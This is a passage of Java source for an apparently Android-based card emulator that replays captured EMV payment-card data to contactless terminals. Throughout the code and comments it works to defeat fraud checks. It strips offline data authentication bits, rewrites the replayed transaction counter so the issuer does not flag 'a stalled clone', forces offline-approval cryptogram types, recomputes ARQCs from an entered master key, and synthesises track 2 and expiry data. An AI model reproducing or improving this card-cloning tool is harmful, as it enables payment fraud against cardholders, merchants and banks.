        byte[] a = txnAip;
        if (a == null) {
            a = hex(hexBox("aip", DEFAULT_AIP));
            if (a.length >= 2) a = new byte[]{(byte) (a[0] & AIP_KEEP_MASK), a[1]};
        }
        if (a.length < 2) a = hex(DEFAULT_AIP);
        return a;
    }

    /**
     * IAD in force: captured first, then typed, then the profile's own default.
     *
     * The profile step exists because an Amex card must not inherit the M/Chip
     * default - it has no CVN block and cvn() would read byte 2 of a fabricated
     * one. Amex returns an empty string, which means the tag is omitted.
     *
     * ONCE A KEY IS SET THE IAD IS NOT OPTIONAL. It goes into the MAC input, so
     * an empty one MACs a shorter string than the issuer reconstructs and the
     * ARQC fails with a correct key - which reads as a wrong key. Capture the
     * real 9F10 off a live GPO and type it before the tap that matters.
     *
     * THE TYPED VALUE IS CLEANED. It is fed to Hex.hex() in three places, so a
     * space or a stray character used to be a 6F00 on the GPO - and a 6F00 on
     * the GPO is a dead tap with the whole card unread. hexBox() ends at the
     * profile default instead, which is at least a legal IAD.
     */
    private String iadHex() {
        if (capturedIad != null) return bytesToHex(capturedIad);
        String typed = hexBox("iad", "");
        if (!typed.isEmpty()) return typed;
        String d = activeProfile().defaultIad();
        return d == null ? DEFAULT_IAD : d;
    }

    private boolean haveKey() {
        int n = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "").length();
        return n == 32 || n == 48;
    }

    private byte[] cap(String key) {
        return hexOrNull(p("cap_" + key, ""));
    }

    private byte[] rawPpse() { return cap("rawppse"); }
    private byte[] rawFci()  { return cap("rawfci"); }
    private byte[] rawGpo()  { return cap("rawgpo"); }

    private byte[] rawRec(int sfi, int rec) {
        return cap("rec" + sfi + "_" + rec);
    }

    private String holderName() {
        return p("name", p("cap_holder", ""));
    }

    private String nameLine() {
        String h = holderName();
        String pan = p("pan", "");
        String tail = pan.length() >= 4 ? "  \u2022\u2022" + pan.substring(pan.length() - 4) : "";
        if (h.isEmpty()) return pan.isEmpty() ? "Tapping - card is empty" : "Tapping" + tail;
        return h + tail;
    }

    private byte[] holder() {
        String h = holderName().toUpperCase()
                .replaceAll("[^A-Z0-9 ./'-]", "")
                .replaceAll("\\s+", " ")
                .trim();
        if (h.length() < 2) return null;
        if (h.length() > 26) h = h.substring(0, 26);
        return h.getBytes(StandardCharsets.ISO_8859_1);
    }

    // ---------- MSD key material ----------

    /**
     * KDCVC3.
     *
     * The CSC is NOT session-keyed and does NOT use the AC key. It uses a
     * card-specific key derived from IMKCVC3 over PAN and PSN, exactly like an
     * ICC master key. The key is static per card; all variation enters through
     * the UN and ATC in the block.
     *
     * The derivation yields ONE 16-byte double-length key, so it is the two
     * halves concatenated.
     */
    private byte[] kdCvc3() {
        String mk = p("imkcvc3", "").replaceAll("[^0-9A-Fa-f]", "");
        if (mk.length() != 32 && mk.length() != 48) return null;
        try {
            byte[][] k = EmvCrypto.iccMasterKeys(mk, pan(), psn());
            return cat(k[0], k[1]);
        } catch (Exception e) {
            tap("!! KDCVC3 derivation failed: " + e);
            return null;
        }
    }

    // ---------- the profile in force ----------

    private CardProfile activeProfile() {
        String name = p("profile", "").toUpperCase();
        if (!name.isEmpty() && !name.equals(Profiles.AUTO)) {
            CardProfile c = Profiles.byName(name);
            if (c != null) return c;
        }
        CardProfile c = Profiles.forPan(pan());
        if (c != null) return c;
        return Profiles.byName("MASTERCARD");
    }

    /**
     * The AID in force, cleaned.
     *
     * The box is free text and every consumer - appEntry(), the 4F in select(),
     * the PPSE entry - hands it to Hex.hex(), which throws on an odd nibble or a
     * stray character. A throw on the SELECT is the worst place for one: the tap
     * is dead before the terminal has said which app it wants.
     *
     * An AID that no longer matches the profile falls back to the profile's own,
     * so a typo cannot pair a Visa AID with the Mastercard script.
     */
    private String aidFor(CardProfile prof) {
        String a = hexBox("aid", "");
        if (!a.isEmpty() && prof.matchesAid(a)) return a;
        return prof.defaultAid();
    }

    private String profileScript() {
        CardProfile prof = activeProfile();
        String aid = aidFor(prof);

        StringBuilder sb = new StringBuilder();
        sb.append(prof.selectPpse(aid)).append('\n');
        for (String line : prof.selectApp(aid, labelText())) {
            if (line != null && !line.isEmpty()) sb.append(line).append('\n');
        }
        sb.append(prof.gpo(txnAtc(), txnAcHex())).append('\n');
        return sb.toString();
    }

    // ---------- script overrides ----------

    private String scriptRaw() {
        String box = p("script", "").trim();
        return box.isEmpty() ? profileScript() : box;
    }

    private boolean useScript() {
        if (p("script", "").trim().isEmpty()) return scriptLines() > 0;
        String v = p("usescript", "1").trim();
        return !v.equals("0");
    }

    private int scriptLines() {
        String raw = scriptRaw();
        if (raw.isEmpty()) return 0;
        int n = 0;
        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            if (line.indexOf('=') > 0) n++;
        }
        return n;
    }

    private String scriptMatch(byte[] apdu) {
        String raw = scriptRaw();
        if (raw.isEmpty()) return null;

        String cmd = bytesToHex(apdu);
        String best = null;
        int bestLen = -1;

        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            int eq = line.indexOf('=');
            if (eq <= 0) continue;

            String m = line.substring(0, eq).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            String r = line.substring(eq + 1).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            if (m.isEmpty() || m.length() % 2 != 0) continue;
            if (r.length() < 2 || r.length() % 2 != 0) continue;
            if (cmd.startsWith(m) && m.length() > bestLen) {
                best = r;
                bestLen = m.length();
            }
        }
        return best;
    }

    private static boolean looksLikeSw(int cls) {
        return cls == 0x90 || (cls >= 0x61 && cls <= 0x6F);
    }

    private static int kernelFor(String aidHex) {
        String a = aidHex == null ? "" : aidHex.toUpperCase();
        if (a.startsWith("A000000152")) return 6;
        if (a.startsWith("A000000015")) return 6;
        if (a.startsWith("A000000004")) return 2;
        if (a.startsWith("A000000065")) return 5;
        if (a.startsWith("A000000025")) return 4;
        if (a.startsWith("A000000333")) return 7;
        return 3;
    }

    private byte[] appEntry(String aidHex, String label, int priority) {
        return cat(
                tlv(0x4F, hex(aidHex)),
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{(byte) priority}),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
    }

    private byte[] buildPpse() {
        byte[] captured = rawPpse();
        if (captured != null && captured.length >= 4) {
            if (captured.length >= 2
                    && (captured[captured.length - 2] & 0xFF) == 0x90
                    && (captured[captured.length - 1] & 0xFF) == 0x00) {
                captured = Arrays.copyOf(captured, captured.length - 2);
            }
            tap("-- ppse source: captured " + captured.length + "B");
            return captured;
        }

        String realAid = capAid();
        if (realAid.isEmpty()) realAid = hexBox("aid", DEFAULT_AID);

        byte[] entry = PPSE_MINIMAL
                ? cat(tlv(0x4F, hex(realAid)), tlv(0x87, new byte[]{0x01}))
                : appEntry(realAid, labelText(), 1);

        ByteArrayOutputStream dir = new ByteArrayOutputStream();
        byte[] e0 = tlv(0x61, entry);
        dir.write(e0, 0, e0.length);

        if (EXTRA_AIDS) {
            if (!realAid.equalsIgnoreCase("A0000000031010")) {
                byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
                dir.write(e, 0, e.length);
            }
            if (!realAid.equalsIgnoreCase("A0000000041010")) {
                byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
                dir.write(e, 0, e.length);
            }
        }

        byte[] fci = tlv(0xBF0C, dir.toByteArray());
        byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
        byte[] built = tlv(0x6F, inner);
        tap("-- ppse source: generated, " + built.length + "B");
        return built;
    }

    /**
     * Rewrite the 84 in a captured FCI and return it, or null to fall back.
     *
     * THE TRUNCATION IS NOW NAMED. The walk stops at the outer length, so a
     * capture whose length field overruns its own bytes used to produce a
     * silently short FCI - and a short FCI is a kernel rejecting the app with
     * one 6A82 and no log line worth reading. If the walk yields nothing, or the
     * outer length is zero, the caller serves a generated FCI instead and says
     * so.
     *
     * The status word is stripped by the caller, not here: the outer length does
     * not cover it, and a 9000 left inside the walk window is parsed as tag 90
     * length 00 and re-emitted, growing the template by two bytes.
     */
    private byte[] patchFci(byte[] fci, byte[] aid) {
        if (fci == null || fci.length < 4) return null;

        int[] pos = new int[1];
        int outer = readTag(fci, pos);
        int outerLen = readLen(fci, pos);
        if (outerLen <= 0 || pos[0] + outerLen > fci.length) {
            tap("!! captured fci: outer " + String.format("%02X", outer) + " len " + outerLen
                    + " does not fit " + fci.length + "B - generating instead");
            return null;
        }
        int end = pos[0] + outerLen;

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(fci, q);
            int l = readLen(fci, q);
            if (q[0] + l > end) break;
            byte[] v = Arrays.copyOfRange(fci, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x84) {
                v = aid;
            } else if (t == 0xA5) {
                v = patchA5(v, aid);
            }

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        if (out.size() == 0) {
            tap("!! captured fci: walk produced nothing - generating instead");
            return null;
        }
        return tlv(outer, out.toByteArray());
    }

    /**
     * Rewrite the 84 inside a captured A5, leaving everything else alone.
     *
     * A List walk, not a Map. Two reasons:
     *
     * 1. A captured proprietary template may repeat a tag, and a TreeMap keys
     *    on the tag, so the first copy is silently overwritten and disappears
     *    from the FCI with no error anywhere.
     * 2. A Map re-sorts by tag number. The bytes served should be the card's
     *    own bytes in the card's own order; nothing here needs them sorted.
     *
     * Only the top-level A5 is walked - the values are copied verbatim and never
     * recursed, so a nested 84 inside a sub-template keeps its own value.
     */
    private byte[] patchA5(byte[] a5, byte[] aid) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = 0;
        while (i < a5.length) {
            int[] q = new int[]{i};
            int t = readTag(a5, q);
            int l = readLen(a5, q);
            if (q[0] + l > a5.length) break;
            byte[] v = Arrays.copyOfRange(a5, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x84) v = aid;

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return out.toByteArray();
    }

    private byte[] afl() {
        String typed = p("afl", "").replaceAll("[^0-9A-Fa-f]", "");
        if (typed.length() >= 8 && typed.length() % 8 == 0) {
            tap("-- afl source: typed");
            return hex(typed);
        }

        // MSD with an explicit location: advertise exactly that entry, or the
        // GPO points the terminal at a record the skeleton is not in.
        if (isMsd()) {
            String loc = p("msdloc", "").replaceAll("[^0-9A-Fa-f]", "");
            if (loc.length() == 4) {
                tap("-- afl source: msd location " + loc);
                ByteArrayOutputStream o = new ByteArrayOutputStream();
                int sfi = Integer.parseInt(loc.substring(0, 2), 16);
                int rec = Integer.parseInt(loc.substring(2, 4), 16);
                aflEntry(o, sfi, rec, rec);
                return o.toByteArray();
            }
        }

        TreeMap<Integer, TreeSet<Integer>> map = new TreeMap<>();
        String prefix = sel() + "cap_rec";

        for (String k : keys()) {
            if (!k.startsWith(prefix)) continue;
            String rest = k.substring(prefix.length());
            if (rest.startsWith("_")) rest = rest.substring(1);
            int us = rest.indexOf('_');
            if (us <= 0) continue;
            try {
                int sfi = Integer.parseInt(rest.substring(0, us));
                int rec = Integer.parseInt(rest.substring(us + 1));
                if (sfi < 1 || sfi > 30 || rec < 1 || rec > 255) continue;
                TreeSet<Integer> set = map.get(sfi);
                if (set == null) { set = new TreeSet<>(); map.put(sfi, set); }
                set.add(rec);
            } catch (NumberFormatException ignored) { }
        }

        if (map.isEmpty()) {
            // MSD has nothing at SFI 1 unless a skeleton was put there, so an
            // invented entry points the terminal at a record that will 6A83.
            // EMV is the opposite: syntheticRecord() really is at SFI 1 rec 1,
            // and an empty AFL there would stop the terminal reading at all.
            if (isMsd()) {
                tap("-- afl source: no records and no msd location - empty afl");
                return new byte[0];
            }
            tap("-- afl source: no records - synthetic record is at SFI 1 rec 1");
            TreeSet<Integer> one = new TreeSet<>();
            one.add(1);
            map.put(1, one);
        } else {
            tap("-- afl source: derived from " + map.size() + " SFI(s)");
        }

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<Integer, TreeSet<Integer>> e : map.entrySet()) {
            int sfi = e.getKey();
            int runStart = -1, prev = -1;
            for (int rec : e.getValue()) {
                if (runStart < 0) {
                    runStart = rec;
                } else if (rec != prev + 1) {
                    aflEntry(out, sfi, runStart, prev);
                    runStart = rec;
                }
                prev = rec;
            }
            if (runStart >= 0) aflEntry(out, sfi, runStart, prev);
        }
        return out.toByteArray();
    }

    private static void aflEntry(ByteArrayOutputStream out, int sfi, int first, int last) {
        out.write((sfi << 3) & 0xFF);
        out.write(first & 0xFF);
        out.write(last & 0xFF);
        out.write(0x00);
    }

    /**
     * YYMMDD, six digits.
     *
     * Every branch below that invents a digit is a guess, and a wrong expiry in
     * track 2 is a decline at the issuer with no local symptom. The last resort
     * is 311201 - a card expiring in December 2031 - which is plausible enough
     * to pass unnoticed, so it is worth saying out loud.
     */
    private String expiry6() {
        String d = p("expiry", "3112").replaceAll("[^0-9]", "");

        if (d.length() >= 6) return d.substring(0, 6);

        if (d.length() == 4) {
            if (!expiryWarned) tap("!! expiry \"" + d + "\" has no day - using " + d + "01");
            expiryWarned = true;
            return d + "01";
        }
        if (d.length() == 5) {
            String out = d.substring(0, 4) + "01";
            if (!expiryWarned) tap("!! expiry \"" + d + "\" is five digits - using " + out);
            expiryWarned = true;
            return out;
        }
        if (d.length() == 2) {
            String yy = String.format("%02d", Calendar.getInstance().get(Calendar.YEAR) % 100);
            int v = Integer.parseInt(d);
            String out = (v >= 1 && v <= 12) ? yy + d + "01" : d + "0101";
            if (!expiryWarned) tap("!! expiry \"" + d + "\" is a bare month - using " + out);
            expiryWarned = true;
            return out;
        }

        if (!expiryWarned) tap("!! expiry \"" + d + "\" unusable - using 311201");
        expiryWarned = true;
        return "311201";
    }

    private byte[] track2() {
        String t = p("track2", "").toUpperCase().replace('=', 'D');
        t = t.replaceAll("[^0-9A-F]", "");
        // A leading 'B' is a start sentinel, not a nibble. The box is stored
        // normalised, but an older slot or a hand-typed value can still carry it
        // and hex("B411...") is one nibble out for the whole track.
        while (t.startsWith("B")) t = t.substring(1);

        if (t.isEmpty()) {
            String exp = expiry6();
            String svc = p("service", "201").replaceAll("[^0-9]", "");
            while (svc.length() < 3) svc = "0" + svc;
            t = pan()
                    + "D"
                    + exp.substring(0, 4)
                    + svc.substring(0, 3)
                    + p("discretionary", "").replaceAll("[^0-9]", "");
        }

        if (t.length() % 2 != 0) t += "F";
        return hex(t);
    }

    /**
     * The synthetic SFI 1 record - the EMV record, not the MSD one.
     *
     * THE CIACs ARE ALL ZERO on purpose: the sample card's masks had byte 1 b8
     * set (ODA not performed), which the kernel sets for a clone, so the card
     * volunteered a denial and a forced-online. Zeros contribute nothing and
     * the terminal's own TAC ORs on top anyway.
     *
     * MSD does not use this record for its track - the magstripe skeleton is a
     * personalised 57 served verbatim.
     *
     * 8C, 8D and 8E come from the card's boxes when they hold a valid DOL, so
     * the CDOL and CVM list in the editor finally reach the wire. A blank or
     * malformed box serves the constant. 8E is checked for shape by cvmBox(),
     * not by TlvValidator - a CVM list carries no tags.
     */
    private byte[] syntheticRecord() {
        String panS = pan();
        String expS = expiry6();
        String psnS = psn();
        if (panS.length() % 2 != 0) panS += "F";

        byte[] h = holder();

        return tlv(0x70, cat(
                tlv(0x9F42, hex("0840")),
                tlv(0x5F24, hex(expS)),
                tlv(0x5A, hex(panS)),
                tlv(0x5F34, hex(psnS)),
                h == null ? new byte[0] : tlv(0x5F20, h),
                tlv(0x9F07, hex("FFC0")),
                tlv(0x9F08, hex("0002")),
                tlv(0x8C, hex(dol("cdol1", CDOL1))),
                tlv(0x8D, hex(dol("cdol2", CDOL2))),
                tlv(0x8E, hex(cvmBox())),
                tlv(0x9F0D, hex("0000000000")),
                tlv(0x9F0E, hex("0000000000")),
                tlv(0x9F0F, hex("0000000000")),
                tlv(0x5F28, hex("0840")),
                tlv(0x57, track2())));
    }

    /**
     * The MSD record, served verbatim.
     *
     * Nothing here is regenerated per tap: the bitmaps and the 9F69 descriptor
     * are part of the personalised skeleton and the CSC slot stays as carved.
     * The terminal writes the CSC into its own copy, never into this one.
     *
     * A 70 wrapper is added when the skeleton arrives bare. Without it the
     * record is not a record and the parser has nothing to read.
     *
     * hexLenient, because a hand-typed odd-length skeleton is a typo worth
     * padding rather than a throw: this is read several times per tap from
     * unOffset/unLen/udolLen, all of which are on the response path.
     */
    private byte[] msdRecord() {
        String h = p("msdrec", "").replaceAll("[^0-9A-Fa-f]", "");
        if (h.isEmpty()) return null;
        byte[] r;
        try {
            r = hex(h);
        } catch (IllegalArgumentException oddLength) {
            r = Hex.hexLenient(h);
        }
        if (r.length == 0) return null;
        if ((r[0] & 0xFF) == 0x70) return r;
        tap("-- msd: skeleton had no 70 wrapper - wrapped");
        return tlv(0x70, r);
    }

    /**
     * SFI/record that carries the skeleton, as "ssrr" hex.
     *
     * Falls back to the first AFL entry, then to SFI 1 rec 1.
     */
    private int[] msdLocation() {
        String v = p("msdloc", "").replaceAll("[^0-9A-Fa-f]", "");
        if (v.length() == 4) {
            try {
                return new int[]{Integer.parseInt(v.substring(0, 2), 16),
                                 Integer.parseInt(v.substring(2, 4), 16)};
            } catch (NumberFormatException ignored) { }
        }
        byte[] a = afl();
        if (a.length >= 4) return new int[]{(a[0] & 0xFF) >> 3, a[1] & 0xFF};
        return new int[]{1, 1};
    }

    @Override
    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
        try {
            if (apdu == null || apdu.length < 4) return SW_MALFORMED;

            int ins = apdu[1] & 0xFF;
            int p1  = apdu[2] & 0xFF;
            int p2  = apdu[3] & 0xFF;

            boolean isSelect = (ins == 0xA4);

            // FIRST APDU OF A TAP. See tapOpen - the reset used to live in the
            // PPSE branch below, so a terminal that opened with SELECT AID ran
            // the whole tap on the previous tap's counters and slot.
            if (!tapOpen) {
                tapOpen = true;
                clearLog();
                resetTransaction();
                seedAtcFromCapture();
                warnIfAtcStale();
                termLog("=== tap "
                        + new java.text.SimpleDateFormat("HH:mm:ss",
                                java.util.Locale.US).format(new java.util.Date())
                        + " ===");
                int n = scriptLines();
                tap("-- profile: " + activeProfile().name()
                        + " | script " + n + " line(s), gate="
                        + (useScript() ? "ON" : "OFF")
                        + " | msd=" + isMsd()
                        + " | forcetc=" + forceOfflineTc()
                        + " | slot=" + sel()
                        + " | atc=" + p("atc", "001B")
                        + " floor=" + p("atcfloor", "-"));
                popup(nameLine());
            }

            // The PDOL data is needed before the script is evaluated, because
            // the profile's own gpo() MACs over it. See txnPdol.
            if (ins == 0xA8) txnPdol = pdolDataOf(apdu);

            if (isSelect && apdu.length >= 5) {
                int lc0 = lcOf(apdu);
                int off0 = dataOff(apdu);
                if (apdu.length >= off0 + lc0) {
                    byte[] nm = new byte[lc0];
                    System.arraycopy(apdu, off0, nm, 0, lc0);
                    if (Arrays.equals(nm, PPSE)) sawPpse = true;
                }
            }

            tap(">> " + bytesToHex(apdu));

            // READ RECORD walks the AFL the GPO handed out. Before any GPO there
            // is no AFL and the old behaviour stands.
            if (ins == 0xB2 && txnAfl != null
                    && !aflContains(txnAfl, (p2 >> 3), p1)) {
                tap("-- rec sfi=" + (p2 >> 3) + " rec=" + p1 + " is outside the AFL");
                tap("<< " + bytesToHex(SW_NO_RECORD));
                return SW_NO_RECORD;
            }

            if (isSelect)         nSelects++;
            else if (ins == 0xA8) nGpos++;
            else if (ins == 0xB2) nRecs++;
            else if (ins == 0xAE) nGens++;
            else if (ins == 0x2A) nCccs++;

            String hit = useScript() ? scriptMatch(apdu) : null;
            if (hit != null) {
                scriptHits++;

                // NORMALISE THE STATUS WORD FIRST. Every edit below walks the
                // outer template, and a 9000 left inside the walk window is
                // parsed as tag 90 length 00 and re-emitted - two extra bytes
                // and a body whose outer length no longer matches.
                byte[] body = hex(hit);
                if (body.length >= 2 && looksLikeSw(body[body.length - 2] & 0xFF)) {
                    body = Arrays.copyOf(body, body.length - 2);
                }

                if (ins == 0xA8) {
                    // The script path returns before gpo() runs, so the MSD mask
                    // inside gpo() never applied while a script was armed - and
                    // every profile arms one. Same edit, applied to the bytes.
                    if (isMsd()) {
                        body = msdAip(body);
                        tap("-- msd: gpo format 1 aip=" + bytesToHex(capturedAip(body))
                                + " afl=" + bytesToHex(Arrays.copyOfRange(body, 2, body.length))
                                + " payload=" + body.length + "B " + bytesToHex(body));
                    }
                    byte[] sa = capturedAip(body);
                    if (sa != null && sa.length >= 2) {
                        txnAip = sa;
                        tap("-- script GPO AIP parked for the MAC: " + bytesToHex(sa));
                    }
                    byte[] siad = findTag(body, 0x9F10);
                    if (siad != null) capturedIad = siad;

                    byte[] scid = findTag(body, 0x9F27);
                    gpoCid = (scid == null || scid.length < 1) ? "" : bytesToHex(scid);
                    lastCid = gpoCid;
                    cryptogramSent = findTag(body, 0x9F26) != null;

                    tap("-- script served the GPO | ac in gpo: "
                            + (cryptogramSent ? "yes cid " + gpoCid
                                              : "no, it comes in GENERATE AC"));
                } else if (ins == 0xAE) {
                    cryptogramSent = findTag(body, 0x9F26) != null;
                    byte[] scid = findTag(body, 0x9F27);
                    if (scid != null && scid.length >= 1) lastCid = bytesToHex(scid);
                    tap("-- script served GENERATE AC | cid " + lastCid);
                }

                // THE AC WAS MACED OVER NOTHING HERE. The profile builds the GPO
                // with an AC over an empty field, so a scripted tap handed the
                // issuer a cryptogram covering no amount, no currency and no
                // terminal country - valid structure, unverifiable input. It is
                // recomputed over the real PDOL (GPO) or CDOL (GENERATE AC) data
                // the terminal actually sent, and written back into the tag that
                // is already there.
                if (cryptogramSent && haveKey()) {
                    byte[] macIn = (ins == 0xA8)
                            ? (txnPdol == null ? new byte[0] : txnPdol)
                            : dataOf(apdu);
                    String atc = txnAtc();
                    byte[] ac = computeAc(atc, macIn);
                    if (forceAc(body, ac) != null) {
                        txnAc = bytesToHex(ac);
                        tap("-- script AC recomputed over the real "
                                + (ins == 0xA8 ? "PDOL" : "CDOL") + " data ("
                                + macIn.length + "B)");
                    }
                }

                // THE ATC WAS NEVER COMMITTED ON A SCRIPTED GENERATE AC. The
                // commit sat in the 0xA8 branch only, so an armed script that
                // answered 80 AE burned a counter that was never written and
                // every scripted tap reused it.
                if (cryptogramSent && (ins == 0xA8 || ins == 0xAE)) commitAtc();

                byte[] out = cat(body, SW_OK);
                if (ins == 0xA8) watchForStall();
                tap("-- script hit " + out.length + " bytes");
                tap("<< " + bytesToHex(out));
                trackState(apdu, ins, out);
                return out;
            }

            byte[] out;
            if (isSelect) {
                if (apdu.length < dataOff(apdu)) return SW_MALFORMED;
                out = select(apdu);
            } else if (ins == 0xA8) {
                out = gpo(apdu);
            } else if (ins == 0xB2) {
                out = readRecord(p1, p2);
            } else if (ins == 0xAE) {
                out = genac(apdu);
            } else if (ins == 0x2A) {
                out = ccc(apdu);
            } else if (ins == 0xCA) {
                out = getData(apdu);
            } else if (ins == 0x20) {
                out = SW_OK;
            } else if (ins == 0x84) {
                byte[] ch = new byte[8];
                rnd.nextBytes(ch);
                out = cat(ch, SW_OK);
            } else {
                out = SW_UNSUPPORTED;
            }

            tap("<< " + bytesToHex(out));
            trackState(apdu, ins, out);
            return out;
        } catch (Throwable e) {
            // THROWABLE, not Exception. An APDU answered from a stack that has
            // just overflowed, or from a thread the VM is short of memory on,
            // throws Error - and Error escaping processCommandApdu kills the
            // process on the tap that was already going wrong.
            sawError = true;
            tap("!! " + e);
            return SW_ERR;
        }
    }

    private byte[] select(byte[] apdu) {
        int lc = lcOf(apdu);
        int off = dataOff(apdu);
        if (apdu.length < off + lc) return SW_MALFORMED;
        byte[] name = new byte[lc];
        System.arraycopy(apdu, off, name, 0, lc);

        if (Arrays.equals(name, PPSE)) {
            return cat(buildPpse(), SW_OK);
        }

        if (name.length == 0) {
            String a = capAid();
            if (a.isEmpty()) a = hexBox("aid", DEFAULT_AID);
            name = hex(a);
        }

        String real = capAid();
        if (real.isEmpty()) real = hexBox("aid", "");
        tap("-- selected " + bytesToHex(name)
                + " | card is " + (real.isEmpty() ? "?" : real));

        byte[] captured = rawFci();
        if (captured != null) {
            // The status word is NOT part of the template. Left in, the outer
            // length stops covering the response and the terminal reads a 9000
            // that is not the status word.
            if (captured.length >= 2
                    && (captured[captured.length - 2] & 0xFF) == 0x90
                    && (captured[captured.length - 1] & 0xFF) == 0x00) {
                captured = Arrays.copyOf(captured, captured.length - 2);
            }
            byte[] patched = patchFci(captured, name);
            if (patched != null) {
                tap("-- fci source: captured " + patched.length + "B");
                return cat(patched, SW_OK);
            }
        }
        tap("-- fci source: generated");

        String label = labelText();
        byte[] prop = cat(
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{0x01}),
                // The descriptor follows the flow, not the build. MSD is a
                // single checksum and wants 9F37 alone - the CDOL1 box is a
                // terminal-input descriptor and would be wrong here; EMV MACs
                // over the CDOL data, so it needs the full CDOL1 or the ARQC
                // covers no amount.
                tlv(0x8C, hex(isMsd() ? CDOL_MSD : dol("cdol1", CDOL1))),
                tlv(0x9F11, new byte[]{0x01}),
                tlv(0x9F12, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(name))}),
                tlv(0x9F38, hex(dol("pdol", PDOL))));
        byte[] inner = cat(tlv(0x84, name), tlv(0xA5, prop));
        return cat(tlv(0x6F, inner), SW_OK);
    }

    /**
     * CID for the GPO.
     *
     * THE PREF COMES FIRST, above the key check. It used to sit below it, so
     * forcing TC on a keyed card did nothing and the box was inert - a keyed
     * card answered ARQC and went online whether you wanted it to or not.
     *
     * A forced 0x80 on a keyless card is still downgraded: computeAc would emit
     * eight zero bytes and the issuer cannot verify those.
     *
     * The forced byte is also range-checked now. The box is free text, and
     * "20" or "FF" used to be served as a CID a kernel cannot interpret - the
     * response then carried 9F27 with a value nothing recognises. Anything that
     * is not 00/40/80 falls back to the ladder.
     *
     * This cannot live in Emv.decideCid. Its first branch is acInGpo, which
     * answers ARQC for a requested ARQC without consulting haveKey() - so once
     * an AC is in the GPO the ladder is bypassed entirely and a zero ARQC goes
     * on the wire.
     */
    private byte gpoCidFor() {
        String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");
        if (forced.length() == 2) {
            byte c = (byte) Integer.parseInt(forced, 16);
            if (c == CID_AAC || c == CID_TC || c == CID_ARQC) {
                return (c == CID_ARQC && !haveKey()) ? CID_TC : c;
            }
            tap("-- cid box \"" + forced + "\" is not 00/40/80 - ladder decides");
        }
        if (forceOfflineTc()) return CID_TC;
        return haveKey() ? CID_ARQC : CID_TC;
    }

    private byte[] gpo(byte[] apdu) {
        byte[] raw = rawGpo();
        boolean msd = isMsd();

        if (raw != null && raw.length >= 4) {
            int[] q = new int[1];
            int outer = readTag(raw, q);
            int olen  = readLen(raw, q);

            if (q[0] + olen + 2 == raw.length
                    && (raw[raw.length - 2] & 0xFF) == 0x90
                    && (raw[raw.length - 1] & 0xFF) == 0x00) {
                raw = Arrays.copyOf(raw, raw.length - 2);
            }

            boolean capMsd = (outer == 0x80);

            if (capMsd == msd) {
                // A captured card's own ODA bits survive a replay untouched
                // otherwise, and every one of them is a check we cannot pass.
                if (!capMsd) Emv.clearOda(raw);
                byte[] aip = capturedAip(raw);
                if (aip != null && aip.length >= 2) {
                    capturedIad = findTag(raw, 0x9F10);

                    if (STRIP_AC) {
                        raw = stripAcTags(raw);
                        gpoCid = "(stripped)";
                        cryptogramSent = false;
                    } else if (capMsd) {
                        // Format 1 is flat, carries no CID, and findTag() refuses
                        // a 0x80 by design - so forceCid() would staple a 9F27
                        // TLV into an AIP/AFL payload. A format 1 replay keeps
                        // the captured bytes untouched. Its ATC is not in the
                        // GPO either; ccc() emits and commits that.
                        gpoCid = "";
                        cryptogramSent = false;
                    } else {
                        byte rc = gpoCidFor();
                        raw = forceCid(raw, rc);
                        gpoCid = String.format("%02X", rc & 0xFF);

                        // THE ATC WAS FROZEN HERE. A replayed 9F36 is the
                        // plastic's, and returning the captured bytes verbatim
                        // handed the issuer the same counter value on every
                        // single tap - the window check then sees a stalled
                        // clone. Replace it with this tap's ATC and spend it.
                        // No 9F36 in the capture means nothing to patch, and
                        // nothing was served, so nothing is committed either.
                        if (findTag(raw, 0x9F36) != null) {
                            raw = forceAtc(raw, hex(txnAtc()));
                            commitAtc();
                        }

                        // cryptogramSent USED TO BE !STRIP_AC, unconditionally.
                        // A capture with no 9F26 in it therefore told
                        // Emv.decideCid that an AC had already gone out, and its
                        // first branch answered ARQC for a requested ARQC
                        // without ever consulting haveKey() - a zero cryptogram
                        // on the wire. The flag now follows the tag.
                        cryptogramSent = findTag(raw, 0x9F26) != null;
                    }

                    txnAip = capturedAip(raw);
                    tap("-- gpo replay aip=" + bytesToHex(txnAip)
                            + " (" + (STRIP_AC ? "AC tags stripped"
                                    : capMsd ? "format 1 - cid and atc untouched"
                                             : "cid forced to " + gpoCid
                                               + ", atc " + (pendingAtc == null ? "captured" : pendingAtc))
                            + ") len=" + raw.length
                            + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                } else {
                    tap("-- gpo replay verbatim len=" + raw.length);
                }
                // A stall after a replayed GPO is the commonest failure there
                // is, and this path used to return without arming the watcher.
                watchForStall();
                return cat(raw, SW_OK);
            }
            tap("-- msd field=" + msd + " wins over captured framing=" + capMsd);
        }

        byte[] aip = capturedAip(raw);
        if (aip == null || aip.length < 2) aip = hex(hexBox("aip", DEFAULT_AIP));
        if (aip.length < 2) aip = hex(DEFAULT_AIP);

        byte[] used = new byte[]{aip[0], aip[1]};

